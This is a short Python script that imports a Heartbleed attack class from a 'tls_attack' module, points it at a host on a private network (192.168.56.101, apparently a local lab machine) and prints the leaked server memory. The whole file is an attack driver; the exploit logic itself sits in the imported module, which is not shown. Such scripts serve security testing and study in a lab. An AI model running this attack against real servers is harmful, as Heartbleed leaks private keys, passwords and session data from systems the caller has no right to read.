import logging
import sys
import time

from tls_attack.module.HeartbleedAttack import *

logging.basicConfig(stream=sys.stdout, level=logging.WARN)

attack = HeartbleedAttack("192.168.56.101")
print(attack.leak_data())
